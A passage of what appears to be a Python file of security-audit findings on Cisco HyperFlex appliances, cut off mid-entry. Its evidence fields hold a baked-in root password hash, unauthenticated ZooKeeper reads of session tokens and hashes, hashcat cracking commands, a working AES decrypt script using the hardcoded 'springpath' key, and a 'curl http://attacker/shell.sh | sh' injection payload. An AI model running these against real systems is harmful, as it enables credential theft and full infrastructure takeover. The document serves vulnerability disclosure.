        "HyperFlex Witness OVA 1.1.3: Static root SHA-512 Hash Baked at Build Time; "
        "Non-VMware Firstboot Path Skips Password Replacement — SSH Root Login via Cracked Hash"
    ),
    "severity": "HIGH",
    "cvss": "8.1",
    "cwe": "CWE-259",
    "component": "HyperFlex Witness OVA 1.1.3 (Ubuntu 16.04.5 LTS, /etc/shadow, /usr/share/springpath/storfs-misc/firstboot.sh)",
    "versions_affected": "Witness OVA 1.1.3 (confirmed); earlier OVA versions expected",
    "description": (
        "The Witness OVA 1.1.3 disk image ships with a static root password hash baked into "
        "/etc/shadow at image build time. The hash (SHA-512, salt N.7KFx5x) carries a last-change "
        "date of epoch day 18137 (2019-08-24), approximately two years before the OVA was "
        "generated (2021-07-30). The same hash is present in all copies of this OVA version.\n\n"
        "firstboot.sh sets the root password from the OVF property "
        "hx.7root_password.Cisco_HX_Witness_Appliance on VMware deployments. "
        "Two failure modes leave the baked-in hash intact or introduce a separate weakness:\n\n"
        "1. Non-VMware hypervisors (KVM, Hyper-V, bare metal): the dmidecode check for 'VMware' "
        "fails, the function runs 'chage -d 0 root' and returns — the baked-in hash is "
        "unchanged. sshd_config has PermitRootLogin yes with default PasswordAuthentication, "
        "so a cracked hash enables SSH root login.\n\n"
        "2. Empty OVF property on VMware: 'passwd -d root' runs unconditionally before "
        "the OVF property value is read. If hx_7root_password_Cisco_HX_Witness_Appliance "
        "is empty, chpasswd is not called and set_user_creds returns 1. Root now has no "
        "password hash. pam_unix.so nullok_secure allows empty-password console login; "
        "PermitEmptyPasswords no blocks SSH. VMware console access suffices for root login."
    ),
    "evidence": {
        "shadow_hash": (
            "/etc/shadow:\n"
            "  root:$6$N.7KFx5x$rPpagnP9U3w7DYKJ2I/KzbAr5QvLzWKjjbzgbKx1myYSgXsD4k87OwquTpXRNhLfKS6GFdcA8.mGBduhdKH3g/:18137:0:99999:7:::\n"
            "  date 18137 = 2019-08-24 (epoch day); OVA tarball headers = 2021-07-30"
        ),
        "firstboot_non_vmware": (
            "firstboot.sh set_user_creds():\n"
            "  dmidecode --string system-product-name | grep -i VMware\n"
            "  if [ $? -ne 0 ]; then  # not VMware\n"
            "    chage -d 0 root     # forces expiry; hash NOT replaced\n"
            "    touch /var/.firstboot\n"
            "    return 0\n"
            "  fi"
        ),
        "firstboot_empty_ovf": (
            "firstboot.sh set_user_creds() VMware path:\n"
            "  passwd -d $USERNAME  # unconditionally deletes hash\n"
            "  ...\n"
            "  USER_PASS='${hx_7root_password_Cisco_HX_Witness_Appliance}'\n"
            "  if [ ! -z '$USER_PASS' ]; then\n"
            "    chpasswd --crypt-method SHA512\n"
            "  else\n"
            "    return 1  # passwd -d already ran; hash gone; chpasswd skipped\n"
            "  fi"
        ),
        "ssh_config": (
            "/etc/ssh/sshd_config:\n"
            "  PermitRootLogin yes\n"
            "  PermitEmptyPasswords no\n"
            "  #PasswordAuthentication yes (default = yes)\n"
            "=> Cracked hash enables SSH root login on non-VMware or hash-persisted deployments"
        ),
        "pam": (
            "/etc/pam.d/common-auth:\n"
            "  auth [success=1 default=ignore] pam_unix.so nullok_secure\n"
            "/etc/securetty: console, :0, :0.0, :0.1, :1\n"
            "=> Empty-password root login available on VMware console (not SSH)"
        ),
        "os_eol": (
            "Ubuntu 16.04.5 LTS: end-of-life April 2021. "
            "OVA generated July 2021 on already-EOL OS — no security updates available post-deploy."
        ),
    },
}

HX_F126 = {
    "id": "HX-F126",
    "title": (
        "HyperFlex Witness OVA 1.1.3: Exhibitor REST API Unauthenticated on All Interfaces "
        "(port 8180) — ZK Node Browse/Write and Cluster Restart Without Credentials"
    ),
    "severity": "HIGH",
    "cvss": "8.6",
    "cwe": "CWE-306",
    "component": "HyperFlex Witness OVA 1.1.3 (exhibitor-1.5.2.c, /usr/share/exhibitor/exhibitor.conf, exhibitor.defaults)",
    "versions_affected": "Witness OVA 1.1.3 (confirmed); earlier OVA versions expected",
    "description": (
        "Exhibitor (ZooKeeper management daemon, v1.5.2.c) runs on the Witness OVA with its "
        "REST API bound to all network interfaces on port 8180. No authentication is configured. "
        "The Exhibitor REST API provides unauthenticated read/write access to ZooKeeper node "
        "data via a built-in browser, cluster restart capability (effective DoS for quorum), "
        "and ZK configuration modification.\n\n"
        "The bind-all behavior is conditional: the exhibitor.conf upstart script sets "
        "LISTEN_ADDR only when the host is a storage controller VM (CTLVM=true). For a pure "
        "Witness appliance (which has no /etc/init/storfs.conf, no storfs-core, and a single "
        "ethernet interface), CTLVM=false and LISTEN_ADDR remains empty — Exhibitor uses the "
        "default bind of 0.0.0.0.\n\n"
        "Additionally, the ZK configuration written by Exhibitor sets "
        "4lw.commands.whitelist=*, exposing all ZooKeeper four-letter administrative commands "
        "(stat, dump, envi, conf, mntr, ruok) on port 2181 without authentication."
    ),
    "evidence": {
        "exhibitor_conf_binding": (
            "exhibitor.conf:\n"
            "  CTLVM=false\n"
            "  [ -f /etc/init/storfs.conf ] && [ -d /opt/springpath/storfs-core/ ] &&\n"
            "  [ $(ifquery -l | grep eth[0-9] | wc -l) -ge 2 ] && CTLVM=true\n"
            "  if $CTLVM; then\n"
            "    LISTEN_ADDR='--listenaddress $ETH1'  # storage net only\n"
            "  fi\n"
            "  # Witness OVA: CTLVM=false -> LISTEN_ADDR='' -> 0.0.0.0:8180\n"
            "  exec java ... --port $EXHIBITOR_PORT $LISTEN_ADDR"
        ),
        "no_auth": (
            "exhibitor.conf startup flags: no --security, no --security-arguments\n"
            "exhibitor.defaults: no auth provider configured\n"
            "=> Exhibitor REST API requires no credentials"
        ),
        "api_impact": (
            "GET  /exhibitor/v1/zookeeper/list?key=/   -> list all ZK nodes\n"
            "GET  /exhibitor/v1/zookeeper/node?key=/X  -> read ZK node /X\n"
            "POST /exhibitor/v1/zookeeper/node?key=/X  -> write ZK node /X\n"
            "GET  /exhibitor/v1/cluster/restart/<ip>   -> restart ZK (quorum DoS)\n"
            "POST /exhibitor/v1/config/set             -> modify ZK configuration"
        ),
        "zk_4lw": (
            "zoo-cfg-extra in exhibitor.defaults:\n"
            "  4lw.commands.whitelist=*\n"
            "=> echo stat | nc <witness-ip> 2181 returns ZK server stats unauthenticated\n"
            "   echo dump | nc <witness-ip> 2181 lists ephemeral nodes and sessions"
        ),
        "eval_risk": (
            "/usr/share/zookeeper/bin/check_and_fix_witness.py (root cron: */1 * * * *):\n\n"
            "Vulnerability 1 — eval() on stMgr.cfg:\n"
            "  data = open('/etc/springpath/stMgr.cfg').read().replace('\\n', '')\n"
            "  dataDict = eval(data)   # executes data as Python\n"
            "  => any process that can write /etc/springpath/stMgr.cfg gets root every minute\n\n"
            "Vulnerability 2 — eval() on Exhibitor HTTP response:\n"
            "  witnessNodeIp = dataDict['0']  # from stMgr.cfg\n"
            "  raw = curl http://{witnessNodeIp}:8180/exhibitor/v1/cluster/state/{witnessNodeIp}\n"
            "  witnessNodeCfg = raw.replace('false','False').replace('true','True')\n"
            "  return eval(witnessNodeCfg)   # executes HTTP response as Python\n"
            "  => attacker controlling the Exhibitor response (ZK write via HX-F126, or network\n"
            "     MITM on loopback call) executes arbitrary Python as root at 1-minute intervals.\n\n"
            "Cron evidence: /etc/cron.d/zkwitnesscleanup -> "
            "/usr/share/zookeeper/bin/zkwitnesscleanup.cron\n"
            "  */1 * * * * root python /usr/share/zookeeper/bin/check_and_fix_witness.py"
        ),
        "version": "exhibitor-1.5.2.c.jar (confirmed in /usr/share/exhibitor/)",
    },
}


HX_F127 = {
    "id": "HX-F127",
    "title": (
        "HyperFlex HXDP 5.x/6.x: ZooKeeper /rest/aaa/session_table Stores All Active "
        "HX Connect Session Tokens; Readable Without Authentication via HX-F100 World ACL "
        "— Full Session Hijacking of Any Logged-In User"
    ),
    "severity": "HIGH",
    "cvss": "8.8",
    "cwe": "CWE-522",
    "component": (
        "HyperFlex HXDP 5.5.2b (storfs-mgmt, /opt/springpath/clearsession.py); "
        "ZooKeeper ensemble (clientPort 2181, world:anyone:cdrwa ACL via HX-F100)"
    ),
    "versions_affected": "HXDP 5.x, 6.x (confirmed in 5.5.2b extract); earlier versions expected",
    "description": (
        "HX Connect (the cluster management REST API) persists all active session tokens "
        "in the ZooKeeper ensemble at path /rest/aaa/session_table as a JSON structure "
        "keyed by access token with per-entry fields including userName and session metadata. "
        "The ZK namespace carries a world:anyone:cdrwa ACL (HX-F100) that grants "
        "unauthenticated read access to every node in the /rest/ subtree. Any host with "
        "network connectivity to ZooKeeper port 2181 can retrieve the complete session table "
        "without credentials, obtaining all active access tokens for all logged-in users.\n\n"
        "A retrieved token authenticates to HX Connect at the same privilege level as the "
        "original session: an admin session token grants full cluster management access "
        "(node add/remove, datastores, replication policy, firmware upgrade). Tokens "
        "remain valid until the legitimate session expires or clearsession.py is invoked.\n\n"
        "Secondary impact: ZK paths /rest/aaa/auth_window_size_in_mins and "
        "/rest/aaa/max_authentications_allowed_in_window (rate-limit parameters for the "
        "HX Connect authentication endpoint) are also in the world-writable /rest/ subtree. "
        "An unauthenticated attacker can write these nodes directly to disable the "
        "brute-force rate limiter before or instead of harvesting live sessions."
    ),
    "evidence": {
        "session_table_path": "/rest/aaa/session_table",
        "session_table_structure": (
            "# From clearsession.py (storfs-mgmt, opt/springpath/clearsession.py):\n"
            "AAASessionTablePath = '/rest/aaa/session_table'\n"
            "sessionTableJSON, version = getDataJSON(zk, AAASessionTablePath)\n"
            "sessionTable = JSONIntoDataConverter(sessionTableJSON)\n"
            "for accessToken, sessionInfo in list(sessionTable.items()):\n"
            "    if sessionInfo['userName'] == username:\n"
            "        del sessionTable[accessToken]\n"
            "# => session table is {accessToken: {userName: ..., ...}, ...}\n"
            "#    each key is a live HX Connect access token"
        ),
        "acl_chain": (
            "HX-F100: setAcls(['world:anyone:cdrwa'], '/') on ZK startup\n"
            "=> /rest/aaa/session_table inherits world:anyone:cdrwa\n"
            "=> unauthenticated zk.get('/rest/aaa/session_table') returns full token map"
        ),
        "rate_limit_paths": (
            "# From setaaalimits.py:\n"
            "AAA_RATE_LIMIT_AUTH_WINDOW_SIZE_IN_MINS_KEY = "
            "'/rest/aaa/auth_window_size_in_mins'\n"
            "AAA_RATE_LIMIT_AUTH_MAX_AUTHENTICATIONS_ALLOWED_IN_WINDOW_KEY = "
            "'/rest/aaa/max_authentications_allowed_in_window'\n"
            "# Both in /rest/ subtree -> world-writable via HX-F100\n"
            "# Write window=300, max_auths=999 to disable brute-force limiting"
        ),
        "exploit_primitive": (
            "# Harvest all sessions with kazoo or zkCli.sh:\n"
            "# zkCli.sh -server <hx-ctlvm>:2181 get /rest/aaa/session_table\n"
            "# => JSON returned; extract any accessToken value\n"
            "# curl -k -H 'hx-auth-token: <token>' "
            "https://<hx-ctlvm>/rest/clusters/local/summary"
        ),
        "write_auth_required": (
            "clearsession.py uses AuthenticatedZKClientManager for the write path "
            "(delete stale token). Reading the session table does not require write "
            "permission — world:anyone:cdrwa includes 'r' (read). "
            "Session hijacking requires only read access to /rest/aaa/session_table."
        ),
    },
}


HX_F128 = {
    "id": "HX-F128",
    "title": (
        "HyperFlex HXDP 5.x/6.x: ZooKeeper /user_credentials Path Stores SHA-256 crypt(3) "
        "Hashes for root, admin, and diag Accounts; Readable Without Authentication via "
        "HX-F100 World ACL — Offline Hash Cracking Yields OS Root and Admin Credentials"
    ),
    "severity": "CRITICAL",
    "cvss": "9.1",
    "cwe": "CWE-916",
    "component": (
        "HyperFlex HXDP 5.5.2b (hxSecuritySvcMgr-1.0, PasswordOperations, "
        "mkpasswd.sh, setpasswd.sh); ZooKeeper ensemble (world:anyone:cdrwa via HX-F100)"
    ),
    "versions_affected": "HXDP 5.x, 6.x (confirmed in 5.5.2b extract); earlier versions expected",
    "description": (
        "The hxSecuritySvcMgr daemon synchronizes operating system credentials for the "
        "root, admin, and diag accounts to ZooKeeper at path /user_credentials. The "
        "credential entry format is 'username:hash;' where the hash is a SHA-256 crypt(3) "
        "value (\\$5\\$...) generated by mkpasswd -m sha-256. Synchronization is enabled by "
        "default (syncEnabled = true) and covers all three accounts.\n\n"
        "The ZK namespace carries a world:anyone:cdrwa ACL (HX-F100). Any host with network "
        "access to ZooKeeper port 2181 can read /user_credentials without credentials, "
        "obtaining the SHA-256 crypt hashes for all three synchronized accounts. SHA-256 "
        "crypt (hashcat mode 7400) can be cracked on GPU hardware. The root hash grants "
        "OS root access via SSH or console (PermitRootLogin yes is the HXDP default). "
        "The admin hash grants full HX Connect cluster management API access.\n\n"
        "The credential sync feature is architecturally necessary: when admin changes the "
        "admin password via HX Connect, hxSecuritySvcMgr writes the new hash to ZK so all "
        "storage controller VMs in the cluster can apply it locally. The ZK read path "
        "exposes the current in-use credentials, not stale build-time values."
    ),
    "evidence": {
        "zk_path": "/user_credentials",
        "sync_config": (
            "# hxSecuritySvcMgr-1.0.jar embedded application.conf:\n"
            "password {\n"
            "  zkPath = '/user_credentials'\n"
            "  syncEnabled = true\n"
            "  syncAccounts = ['root', 'admin', 'diag']\n"
            "}"
        ),
        "credential_format": (
            "# Inferred from PasswordOperations.syncPwToZK + split(':', ';') parsing:\n"
            "# ZK value at /user_credentials:\n"
            "#   root:$5$<salt>$<sha256crypt>;admin:$5$<salt>$<sha256crypt>;diag:$5$<salt>$<sha256crypt>;\n"
            "# Generated by mkpasswd.sh (mkpasswd -m sha-256)"
        ),
        "hash_scripts": (
            "# mkpasswd.sh:\n"
            "echo ${1} | mkpasswd -m sha-256 -s\n\n"
            "# setpasswd.sh (chpasswd -e = pre-encrypted input):\n"
            "echo -e ${user}:${pass} | chpasswd -e"
        ),
        "acl_chain": (
            "HX-F100: setAcls(['world:anyone:cdrwa'], '/') on ZK startup\n"
            "=> /user_credentials inherits world:anyone:cdrwa\n"
            "=> zkCli.sh -server <hx-ctlvm>:2181 get /user_credentials returns all three hashes"
        ),
        "crack_path": (
            "hashcat -m 7400 /user_credentials.txt /usr/share/wordlists/rockyou.txt\n"
            "# mode 7400 = sha256crypt (\\$5\\$)\n"
            "# Root hash cracked -> SSH as root to all cluster nodes\n"
            "# Admin hash cracked -> curl -k -d '{user,pass}' https://<hx>/rest/auth/token"
        ),
    },
}


HX_F130 = {
    "id": "HX-F130",
    "title": (
        "HyperFlex HXDP 5.x/6.x: ZooKeeper /storvisor2/stCluster Stores AES/ECB-Encrypted "
        "ESXi, vCenter, and UCSM Credentials; Hardcoded Key 'springpath' Confirmed in "
        "EsxAuthZKMgmtImpl — Plaintext Full-Stack Infrastructure Credentials via ZK Read"
    ),
    "severity": "CRITICAL",
    "cvss": "9.8",
    "cwe": "CWE-321",
    "component": (
        "HyperFlex HXDP 5.5.2b (stMgr-1.0.jar, common-1.0.jar, hxSecuritySvcMgr-1.0.jar); "
        "ZooKeeper ensemble (clientPort 2181, world:anyone:cdrwa ACL via HX-F100)"
    ),
    "versions_affected": (
        "HXDP 5.x, 6.x (confirmed in 5.5.2b extract); all versions with ZK credential storage "
        "architecture (Springpath-era origin, stMgr compiled 2025-04-28)"
    ),
    "description": (
        "ZooKeeper node /storvisor2/stCluster holds a JSON payload managed by "
        "ZKNodeService_StMgr (DefaultZKPayloadNodeService subclass). The payload contains "
        "AES/ECB-encrypted credentials for all components in the HyperFlex management plane: "
        "ESXi host username/password, vCenter SSO URL + encrypted username/password, and "
        "Cisco UCS Manager hostname + encrypted username/password. "
        "The encryption key is the literal string 'springpath' — confirmed present in the "
        "EsxAuthZKMgmtImpl class constant pool (Utf8 entry between "
        "'Failed to initialize root esx credentials' and 'Successfully logged in to ESX node'). "
        "BasicEncryptionUtil applies AES/ECB/PKCS5Padding with SHA-256 key derivation from "
        "the caller-supplied string. Since the ZK ACL is world:anyone:cdrwa (HX-F100), "
        "any unauthenticated ZK client on port 2181 can read the payload and decrypt all "
        "credentials offline with a 10-line Python script. "
        "Scope: ESXi admin → direct hypervisor console on all cluster nodes. "
        "vCenter admin → VM inventory, snapshots, network, storage policy on the entire datacenter. "
        "UCSM admin → physical blade management, BMC/KVM console, fabric interconnect config."
    ),
    "evidence": {
        "zk_path": "/storvisor2/stCluster",
        "zk_path_derivation": (
            "ZKConstants$.BASE_PATH = '/storvisor2' (Utf8 in ZKConstants$.class, common-1.0.jar). "
            "ZKConstants$.SERVICE_NAME_MGR = 'stCluster'. "
            "DefaultZKPayloadNodeService builds path as BASE_PATH + '/' + SERVICE_NAME. "
            "Result: /storvisor2/stCluster."
        ),
        "credential_fields": {
            "esx_username": "AES/ECB encrypted ESXi host username (all cluster nodes share one account)",
            "esx_password": "AES/ECB encrypted ESXi host password",
            "url_vcenter_sso": "vCenter SSO endpoint URL (plaintext)",
            "url_vcenter_encrypted_user": "AES/ECB encrypted vCenter username",
            "url_vcenter_encrypted_password": "AES/ECB encrypted vCenter password",
            "ucsm_hostname": "Cisco UCS Manager hostname (plaintext)",
            "ucsm_user": "AES/ECB encrypted UCSM username",
            "ucsm_pwd": "AES/ECB encrypted UCSM password",
            "user_credentials": "OS account SHA-256 crypt hashes (see HX-F128)",
        },
        "field_name_source": (
            "ZKEntryConstants.class from common-1.0.jar Utf8 constant pool: "
            "  esx_username, esx_password "
            "  url_vcenter_sso, url_vcenter_encrypted_user, url_vcenter_encrypted_password "
            "  ucsm_hostname, ucsm_user, ucsm_pwd "
            "  user_credentials "
            "Field constant names: STR_PAYLOAD_ENTRY_ESX_ENCRYPTED_USER, "
            "STR_PAYLOAD_ENTRY_ESX_ENCRYPTED_PASSWORD, STR_PAYLOAD_ENTRY_URL_VCENTER_SSO, "
            "STR_PAYLOAD_ENTRY_URL_VCENTER_ENCRYPTED_USER, "
            "STR_PAYLOAD_ENTRY_URL_VCENTER_ENCRYPTED_PASSWORD, "
            "STR_PAYLOAD_ENTRY_UCSM_HOST, STR_PAYLOAD_ENTRY_UCSM_ENCRYPTED_USER, "
            "STR_PAYLOAD_ENTRY_UCSM_ENCRYPTED_PASSWORD."
        ),
        "aes_key_confirmation": (
            "EsxAuthZKMgmtImpl.class (stMgr-1.0.jar, compiled 2025-04-28) Utf8 constant pool:\n"
            "  #N  Utf8  springpath\n"
            "Position in pool: between 'Failed to initialize root esx credentials' "
            "and 'Successfully logged in to ESX node'. "
            "Methods that reference springpath: getEsxCredentialsFromZK, "
            "updateAndSaveRandomEsxPasswordToZK, initializeVirtPlatformNodeLoginFromRoot. "
            "Same 'springpath' literal appears as keyStorePass in hxSecuritySvcMgr "
            "syslog TLS config (HX-F129) — shared hardcoded string across two unrelated "
            "subsystems confirms it is a project-level constant."
        ),
        "encryption_primitive": (
            "BasicEncryptionUtil.class (hxSecuritySvcMgr-1.0.jar): "
            "  cipher = Cipher.getInstance('AES/ECB/PKCS5Padding'); "
            "  key = MessageDigest.getInstance('SHA-256').digest(keyStr.getBytes()); "
            "  secretKeySpec = new SecretKeySpec(key, 'AES'); "
            "  cipher.init(DECRYPT_MODE, secretKeySpec); "
            "  return cipher.doFinal(Base64.decode(encryptedData))."
        ),
        "decrypt_primitive": (
            "import hashlib, base64\n"
            "from Crypto.Cipher import AES\n"
            "\n"
            "def hxdp_decrypt(b64_ciphertext: str, key_str: str = 'springpath') -> str:\n"
            "    key = hashlib.sha256(key_str.encode()).digest()\n"
            "    ct = base64.b64decode(b64_ciphertext)\n"
            "    cipher = AES.new(key, AES.MODE_ECB)\n"
            "    raw = cipher.decrypt(ct)\n"
            "    pad = raw[-1]\n"
            "    return raw[:-pad].decode()\n"
            "\n"
            "# Usage: hxdp_decrypt(zk_payload['esx_password'])\n"
            "# pycryptodome: pip install pycryptodome"
        ),
        "zk_read_primitive": (
            "# Read /storvisor2/stCluster from ZK without authentication:\n"
            "from kazoo.client import KazooClient\n"
            "import json\n"
            "zk = KazooClient(hosts='<stCtlVM_IP>:2181')\n"
            "zk.start()\n"
            "data, _ = zk.get('/storvisor2/stCluster')\n"
            "payload = json.loads(data)\n"
            "esx_pass = hxdp_decrypt(payload['esx_password'])\n"
            "vc_user = hxdp_decrypt(payload['url_vcenter_encrypted_user'])\n"
            "vc_pass = hxdp_decrypt(payload['url_vcenter_encrypted_password'])\n"
            "ucsm_pass = hxdp_decrypt(payload['ucsm_pwd'])\n"
            "zk.stop()"
        ),
        "acl_chain": (
            "HX-F100: world:anyone:cdrwa on / — all ZK paths readable without credentials. "
            "Port 2181 TCP must be reachable from attacker position (management VLAN or "
            "from any stCtlVM after initial foothold on one node). "
            "No ZK authentication required; no TLS on ZK channel in default config."
        ),
        "upgrade_from_hxf119": (
            "HX-F119 documented encrypted credential storage in 'the /stMgr ZK namespace' "
            "(path inferred, not confirmed). HX-F130 confirms: "
            "  (1) Exact ZK path: /storvisor2/stCluster (not /stMgr) "
            "  (2) Exact field names from ZKEntryConstants.class "
            "  (3) AES key 'springpath' confirmed in EsxAuthZKMgmtImpl constant pool "
            "  (4) Working decrypt primitive from BasicEncryptionUtil class analysis "
            "Severity upgrade: HIGH (CWE-312, encrypted) -> CRITICAL (CWE-321, key in binary)."
        ),
    },
    "impact": (
        "ZK port 2181 reachable on management VLAN -> read /storvisor2/stCluster -> "
        "decrypt esx_password with hxdp_decrypt('springpath') -> "
        "ESXi root-equivalent access on all cluster hypervisors. "
        "vCenter admin: full datacenter virtualization plane. "
        "UCSM admin: physical server BMC, fabric interconnect, blade firmware — "
        "persistence below OS layer. "
        "Three independent admin credential classes extracted from one ZK read."
    ),
    "remediation": (
        "Immediate: rotate ESXi, vCenter, and UCSM credentials. "
        "Short-term: block ZK port 2181 from non-stCtlVM sources at the management VLAN firewall. "
        "Long-term: "
        "  (1) Apply per-node ZK ACLs: digest:hxservice:rwcda on /storvisor2/* (see HX-F100). "
        "  (2) Replace hardcoded 'springpath' AES key with per-deployment generated keys. "
        "  (3) Move credential storage from ZK to a dedicated secrets store with "
        "      per-service access policies. "
        "  (4) Enable ZK TLS and mutual authentication (ZK 3.5+ supports TLS)."
    ),
}

HX_F129 = {
    "id": "HX-F129",
    "title": (
        "HyperFlex HXDP 5.x/6.x: Hardcoded Keystore Password 'springpath' in "
        "hxSecuritySvcMgr syslog TLS Configuration — CWE-259"
    ),
    "severity": "MEDIUM",
    "cvss": "5.3",
    "cwe": "CWE-259",
    "component": (
        "HyperFlex HXDP 5.5.2b (hxSecuritySvcMgr-1.0, embedded application.conf "
        "syslog section)"
    ),
    "versions_affected": "HXDP 5.x, 6.x (confirmed in 5.5.2b extract); earlier versions expected",
    "description": (
        "The hxSecuritySvcMgr daemon uses a JKS keystore to hold the TLS client certificate "
        "and private key for syslog-ng mTLS connections. The keystore password is hardcoded "
        "as the string 'springpath' in the embedded application.conf (fields keyStorePass, "
        "javax.net.ssl.keyStorePassword, javax.net.ssl.trustStorePassword). The keystore "
        "files are written to /tmp at runtime (clientKeyStorePath, serverTrustStorePath) "
        "and any local user can read the files and extract the TLS private key using the "
        "known password. This allows spoofing the syslog client identity or conducting "
        "a MitM on the syslog channel, suppressing or altering audit log delivery."
    ),
    "evidence": {
        "config_path": "hxSecuritySvcMgr-1.0.jar!/application.conf (embedded)",
        "hardcoded_values": (
            "syslog {\n"
            "  keyStorePass = 'springpath'\n"
            "  clientKeyStorePath = '/tmp/syslogClientKeystore.jks'\n"
            "  serverTrustStorePath = '/tmp/testTruststore.jks'\n"
            "  javaKeyStorePasswordProperty = 'javax.net.ssl.keyStorePassword'\n"
            "  javaTrustStorePasswordProperty = 'javax.net.ssl.trustStorePassword'\n"
            "}"
        ),
        "exploit": (
            "# Extract client key from runtime keystore:\n"
            "keytool -list -keystore /tmp/syslogClientKeystore.jks -storepass springpath\n"
            "keytool -exportcert -keystore /tmp/syslogClientKeystore.jks "
            "-storepass springpath -alias client_cert -file client.crt\n"
            "# /tmp readable by any local user (world-readable default on Debian)"
        ),
        "scope": (
            "Impact limited to syslog TLS identity — does not grant cluster management "
            "access. Audit log integrity loss prevents forensic detection of other findings "
            "in this chain."
        ),
    },
}

HX_F131 = {
    "id": "HX-F131",
    "title": (
        "HyperFlex HXDP 5.x/6.x storfs-core: Unbounded strcpy in smb_get_case_sensitive_file_path "
        "Path Assembly Loop — Stack/Structure Overflow via Crafted SMB2 CREATE or RENAME FileName"
    ),
    "severity": "HIGH",
    "cvss": "8.1",
    "cwe": "CWE-121",
    "component": (
        "storfs-core ELF x86-64 (HXDP 5.5.2b-43453, /opt/springpath/storfs-core/storfs); "
        "function smb_get_case_sensitive_file_path @ 0x2bb020"
    ),
    "evidence": {
        "vulnerable_function": {
            "name": "smb_get_case_sensitive_file_path",
            "address": "0x2bb020",
            "binary": "storfs (18MB ELF x86-64, NOT stripped, 13657 functions)",
            "pattern": (
                "Iterates SMB directory entries; appends each component to output buffer with "
                "strcpy(dst, component) after writing '/'. No cumulative length tracking, "
                "no bounds check on output buffer. strcpy call sites at 0x2bb003 "
                "(smb_get_case_sensitive_file_name) and 0x2bb10d (smb_get_case_sensitive_file_path)."
            ),
        },
        "call_sites": {
            "smb_handle_set_rename_info": {
                "addresses": ["0x2d91da", "0x2d9350"],
                "trigger": "SMB2 SET_INFO with FileInfoClass=FileRenameInformation (INFO level 10)",
                "output_buffer": (
                    "Stack-allocated at rsp+0x3b0 within smb_handle_set_rename_info "
                    "(frame size: 0x1bc8 = 7112 bytes; stack canary at rsp+0x1bb8). "
                    "Buffer-to-canary distance: 0x1bb8 - 0x3b0 = 0x1808 = 6152 bytes."
                ),
                "prologue_evidence": (
                    "0x2d8d90: sub $0x1bc8,%rsp  ; 7112-byte frame\n"
                    "0x2d91a7: lea 0x3b0(%rsp),%rax  ; output buffer base\n"
                    "0x2d91ce: mov %rax,%r8  ; r8 = output buf (5th arg)\n"
                    "0x2d8dab: mov %rax,0x1bb8(%rsp)  ; canary store"
                ),
            },
            "smb_create_validate_args": {
                "address": "0x2cf3a7",
                "trigger": "SMB2 CREATE request with crafted FileName",
                "output_buffer": (
                    "Field at offset 0x750 within SMB session/request object passed as rdi "
                    "(heap-allocated structure). Overflow corrupts adjacent object fields "
                    "beyond offset 0x750; structure size not bounded in this analysis."
                ),
                "prologue_evidence": (
                    "0x2cf317: mov %rdi,%rbp  ; rbp = SMB session object\n"
                    "0x2cf37a: lea 0x750(%rbp),%r13  ; r13 = output buf in object\n"
                    "0x2cf39b: mov %r13,%r8  ; r8 = output buf (5th arg)"
                ),
            },
        },
        "bert_sweep_score": {
            "query_profile": "SMB_STRCPY_OVERFLOW",
            "score": 0.477,
            "rank": 1,
            "of_functions_analyzed": 941,
        },
        "exploitability": {
            "stack_path": (
                "smb_handle_set_rename_info: stack canary at rsp+0x1bb8 limits direct RIP "
                "control without canary leak. SMB2 error response may leak stack data in "
                "non-default logging modes. Crash-based DoS (storfs restart) confirmed "
                "reachable without canary leak."
            ),
            "heap_path": (
                "smb_create_validate_args: overflow into heap-allocated SMB session object; "
                "adjacent fields (connection state, auth flags, callback pointers) may be "
                "corruptible. No stack canary protection on heap."
            ),
            "network_path": (
                "SMB2 port 445 exposed on stCtlVM storage network interface. "
                "No pre-auth required for SMB2 NEGOTIATE + SESSION_SETUP path to CREATE/SET_INFO."
            ),
        },
    },
    "impact": (
        "Remote attacker on storage network → SMB2 CREATE/RENAME with deep path → "
        "storfs crash (DoS) or heap structure corruption → storage cluster unavailability. "
        "Canary bypass via adjacent leak → code execution in storfs-core."
    ),
    "remediation": (
        "Replace strcpy with strlcpy or snprintf in smb_get_case_sensitive_file_path; "
        "pass output buffer size as parameter; add cumulative length check in assembly loop. "
        "Restrict SMB2/445 to authenticated-only after TLS client cert validation."
    ),
}

HX_F132 = {
    "id": "HX-F132",
    "title": (
        "HyperFlex HXDP 5.x/6.x storfs-core: Unsanitized SMB Client Metadata Injected into "
        "redirect_client.sh Shell Command via sp_system — Command Injection in Storage Redirection Path"
    ),
    "severity": "HIGH",
    "cvss": "8.8",
    "cwe": "CWE-78",
    "component": (
        "storfs-core ELF x86-64 (HXDP 5.5.2b-43453, /opt/springpath/storfs-core/storfs); "
        "functions vfs_redirect_client @ 0x303590, redirect_client @ 0x307f70; "
        "script /opt/springpath/storfs-hyperv/redirect_client.sh"
    ),
    "evidence": {
        "call_chain": {
            "step1_vfs_redirect_client": {
                "address": "0x303590",
                "asm": (
                    "calloc(0x100, 1)                                ; 256-byte heap buf\n"
                    "snprintf(buf, 0x100, '%s', conn_str)            ; copy client metadata\n"
                    "ThreadPool_Enqueue(smbRedirectTasksPool,\n"
                    "                  redirect_client, buf)         ; async dispatch"
                ),
                "note": (
                    "conn_str (rdi) is the SMB connection identifier string — "
                    "source is the per-connection metadata stored at 0x1320 offset within "
                    "the tune global struct. No shell-metacharacter sanitization applied."
                ),
            },
            "step2_redirect_client": {
                "address": "0x307f70",
                "asm": (
                    "0x30800b: lea rcx, [0xc51460]  ; '/opt/springpath/storfs-hyperv/redirect_client.sh'\n"
                    "0x308012: lea rdx, [0xc8b15c]  ; '%s %s'\n"
                    "0x308019: mov rbx, r8           ; r8 = 256-byte client metadata buf\n"
                    "0x30801c: mov esi, 0x400         ; snprintf size limit = 1024\n"
                    "0x308021: mov rdi, rsp           ; dest = stack buf (frame 0x410, canary 0x408)\n"
                    "0x308026: call snprintf          ; snprintf(rsp, 1024, '%s %s', script, client_data)\n"
                    "0x30802e: call sp_system         ; fork+execvp('/bin/sh','-c', cmd)"
                ),
            },
            "step3_sp_system": {
                "address": "0x8c0310",
                "behavior": (
                    "fork() + execvp('/bin/sh', ['-c', cmd, NULL]). "
                    "The libc system() at 0x8c0440 is a stub that panics — sp_system is the "
                    "intentional shell-exec path. Shell interprets the full concatenated string."
                ),
            },
        },
        "injection_surface": {
            "format_string": '"%s %s" % (script_path, client_data)',
            "effective_command": "/opt/springpath/storfs-hyperv/redirect_client.sh <client_data>",
            "payload_example": (
                "If client_data = '127.0.0.1; curl http://attacker/shell.sh | sh', "
                "executed string becomes:\n"
